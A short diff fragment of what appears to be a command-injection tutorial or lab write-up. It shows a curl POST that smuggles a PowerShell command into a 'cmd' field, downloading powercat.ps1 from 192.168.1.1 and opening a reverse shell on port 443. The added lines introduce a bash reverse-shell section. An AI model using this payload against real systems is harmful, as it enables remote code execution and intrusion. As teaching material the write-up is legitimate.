@@ -38,3 +38,9 @@ EX (New-Object System.Net.Webclient).DownloadString("http://192.168.1.1/powercat
 ```
    
     $ curl -X POST --data 'cmd=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.1.1%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.1.1%20-p%20443%20-e%20powershell' http://192.168.50.50:8000/cmd
+
+<h4>Linux Shell</h4>
+
+using linux our attack might look like the following, where we use the bash one liner to create a tcp shell to our machine on 443
+
+![_config.yml]({{ site.baseurl }}/images/web/bash_cmd_injection.png)
